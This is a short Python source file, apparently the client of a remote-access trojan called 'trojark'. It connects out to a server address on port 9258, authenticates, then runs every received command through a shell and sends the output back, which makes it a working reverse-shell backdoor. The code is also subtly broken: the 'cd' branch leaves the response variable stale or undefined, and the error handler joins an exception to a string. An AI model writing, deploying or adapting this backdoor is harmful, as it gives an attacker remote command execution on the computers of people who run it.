# python client.py (dev)

import socket
import os
import subprocess
import sys
from server_ip import server_ip

verbose = True if len(sys.argv) > 1 else False
ip = socket.gethostname() if len(sys.argv) > 1 else server_ip
if verbose:
    print(ip)
port = 9258

print("Client has started, connecting to server")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

# Validate client
s.send(bytes("trojark", "utf-8"))

# Handle commands
while True:
    cmd_raw = s.recv(1024)
    cmd = cmd_raw.decode("utf-8")
    if verbose:
        print(f"{cmd=}")

    try:
        if "cd" in cmd:
            os.chdir(cmd.split(" ")[1])
        else:
            response = subprocess.run(
                cmd.split(" "), stdout=subprocess.PIPE, shell=True
            )
        if not response.stdout:
            s.send(bytes("done", "utf-8"))
            if verbose:
                print("response=done")
        else:
            if verbose:
                print(f"{response.stdout=}")
            s.send(response.stdout)  # Response is already a bytes object
    except Exception as e:
        s.send(bytes("Command failed client-side. Error: " + e, "utf-8"))
